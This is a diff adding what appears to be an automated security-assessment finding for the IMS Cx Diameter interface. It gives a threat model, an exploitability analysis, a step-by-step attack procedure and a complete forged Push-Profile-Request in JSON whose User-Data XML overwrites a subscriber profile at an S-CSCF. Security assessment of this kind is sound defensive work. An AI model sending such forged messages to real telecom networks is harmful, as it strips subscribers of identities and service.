@@ -1,0 +1,100 @@
+**Threat Model:**
+- **Attack Assumption:** A misconfigured S-CSCF exposes its Cx Diameter endpoint to the public Internet. The attacker impersonates the HSS role, establishes an unauthenticated Diameter connection, and sends a forged **Push-Profile-Request (PPR)** toward the S-CSCF for a known private user identity already assigned to that S-CSCF.
+- **Attacker Capability:** The attacker can send crafted Cx **Requests** and receive the corresponding Answers on the same connection, but cannot observe or interfere with legitimate HSS<->S-CSCF traffic. The attacker is not an actual IMS serving element beyond being able to speak Diameter as the expected HSS-side peer.
+
+**Exploitability Analysis:**
+`Cx-User-Data` in a Cx **PPR** is independently exploitable under this threat model because it is the authoritative subscriber profile payload that the **S-CSCF** stores and later uses for IMS service handling.
+
+Directionally, PPR is an **HSS->S-CSCF request**. The target field is the top-level `User-Data` AVP in that request. It is not a grouped Diameter AVP; its value is an XML user profile defined by TS 29.228. The request is operationally keyed by `User-Name` as the subscriber's private identity, while the actual overwrite scope is determined by the public identities and service profiles carried inside the XML.
+
+The protocol evidence shows a direct receiver action tied to this field: when `User-Data` is present, the **S-CSCF shall overwrite** its current stored information for the public identities indicated in the included profile. This makes the field authoritative state input, not metadata. The XML carries service profiles, public identities, and service-control information such as Initial Filter Criteria and profile-part applicability. Those data directly influence later SIP registration and session handling.
+
+This creates a distinct field-specific exploit chain beyond generic "forged PPR" impact:
+
+1. The attacker sends a forged PPR with valid routing AVPs and a known `User-Name`.
+2. The malicious `User-Data` XML contains a modified IMS subscription profile.
+3. The S-CSCF accepts and stores that profile for the indicated public identities.
+4. Later IMS processing for that subscriber uses the attacker-supplied profile.
+
+Concrete standards-backed consequences attributable to `User-Data` itself include:
+- removal of one or more public identities from the implicitly registered set by omitting them from the pushed profile, causing the S-CSCF to remove stored information for those identities;
+- alteration of service profile content so later SIP requests are handled with different service logic;
+- modification of iFC / profile-part behavior, changing which application-server triggers apply in registered or unregistered handling.
+
+These are meaningful security-relevant effects because they change persistent subscriber service state in the S-CSCF and can cause service loss, wrong service invocation, identity-set corruption, or durable mismatch between intended and enforced IMS policy. The impact is attributable to the **contents** of `User-Data`, not merely to the fact that a PPR exists. A PPR without `User-Data` would not realize the same profile-overwrite effect.
+
+The state change is semi-persistent: it remains until corrected by a later legitimate HSS push, re-download during later assignment/registration procedures, RTR-driven cleanup, or context removal. Thus recovery exists, but is not immediate.
+
+**Attack Procedure:**
+Craft a minimal but coherent **Cx Push-Profile-Request (command code 305, application id 16777216)** from the attacker-controlled HSS-side connection to the target S-CSCF. Include only mandatory Diameter AVPs plus the target `User-Data` AVP and the mandatory grouped `Vendor-Specific-Application-Id`. Exclude unrelated optional AVPs.
+
+Use:
+- `User-Name` = known private identity already served by the S-CSCF.
+- `Destination-Host` / `Destination-Realm` = target S-CSCF routing values.
+- `User-Data` = schema-valid IMS subscription XML.
+
+For a clear field-driven test, use a malicious `User-Data` value that contains a reduced service profile with only one public identity from an expected implicitly registered set. Under TS 29.228 update semantics, omitted identities in this set-update case are removed from S-CSCF stored information. This is a concrete, observable subscriber-impacting effect caused by the `User-Data` value itself.
+
+Expected success condition: the S-CSCF accepts the PPR and subsequently handles only the retained public identity/service profile, while service behavior for omitted identities changes or disappears until later correction.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 305,
+    "application_id": 16777216,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker-hss.example.net;1710000000;12345"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "scscf1.ims.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "ims.example.net"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "sip:alice-private@ims.example.net"
+    },
+    {
+      "avp_name": "User-Data",
+      "avp_value": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><IMSSubscription><PrivateID>sip:alice-private@ims.example.net</PrivateID><ServiceProfile><PublicIdentity><Identity>sip:alice@ims.example.net</Identity></PublicIdentity></ServiceProfile></IMSSubscription>"
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
